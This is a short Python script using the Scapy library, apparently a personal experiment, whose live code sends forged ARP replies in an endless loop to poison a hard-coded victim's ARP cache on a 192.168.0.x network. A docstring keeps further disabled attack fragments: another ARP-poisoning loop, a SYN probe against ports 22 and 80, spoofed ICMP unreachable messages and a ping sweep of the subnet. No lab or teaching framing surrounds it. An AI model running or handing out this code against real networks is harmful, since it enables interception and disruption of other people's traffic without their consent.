#!/usr/bin/python
# coding: utf-8

from scapy.all import *
import netaddr



def poison(routerIP, victimIP, routerMAC, victimMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
   # send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC)/ICMP(type = 1,code=1))

def identification():
	victimIP = '192.168.0.100'
	routerIP = '192.168.0.1'
	#victimMAC = 'a4:17:31:99:a3:25'
	victimMAC = '16:0a:64:63:bf:c5'
	routerMAC = '64:76:ba:9e:67:26'
	while 1:
		poison(routerIP, victimIP, routerMAC, victimMAC)
		time.sleep(5)

	"""
	victimIP = '192.168.0.107'
	routerIP = '192.168.0.1'
	packet = ARP()
	packet.psrc= routerIP
	packet.pdst= victimIP
	while 1:
		send(packet,verbose=0)
		time.sleep(5)

	p=IP(dst='192.168.0.100',id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
	ls(p)
	ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
	ans.summary()
	unans.summary()
	ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))

	conf.checkIPaddr = False
	ls(ARP)
	victimIP = '192.168.0.107'
	routerIP = '192.168.0.1'
	victimMAC = 'a4:17:31:99:a3:25'
	routerMAC = '64:76:ba:9e:67:26'
	while 1:
		send(IP(dst = '192.168.0.100', src = '192.168.0.1')/ICMP(type = 3))
		time.sleep(5)

	#poison(routerIP, victimIP, routerMAC, victimMAC)
	#mon_ARP= (ARP ( psrc = '192.168.0.1', pdst = '192.168.0.107',op=2))
	#mon_ARP.show()
	#send(mon_ARP, loop =1)

	conf.checkIPaddr = False
	listIP = []
	listNIP = []
	network = "192.168.0.0/24"
	addresses = netaddr.IPNetwork(network)
	liveCounter = 0
	for host in addresses:
		if (host == addresses.network or host == addresses.broadcast):
			continue
		resp = sr1(IP(dst=str(host))/ICMP(),timeout=0.000001,verbose=0)
		if (str(type(resp)) == "<type 'NoneType'>"):
			#print str(host) + " is down or not responding."
			listNIP.append(str(host))
		elif (int(resp.getlayer(ICMP).type)==3 and int(resp.getlayer(ICMP).code) in [1,2,3,9,10,13]):
		    #print str(host) + " is blocking ICMP."
		    listNIP.append(str(host))
		else:
			#print str(host) + " is responding."
			listIP.append(str(host))
			liveCounter += 1

	i = 0
	while i < liveCounter:
		print listIP[i]
		i+=1

	print "Out of " + str(addresses.size) + " hosts, " + str(liveCounter) + " are online."
"""
identification()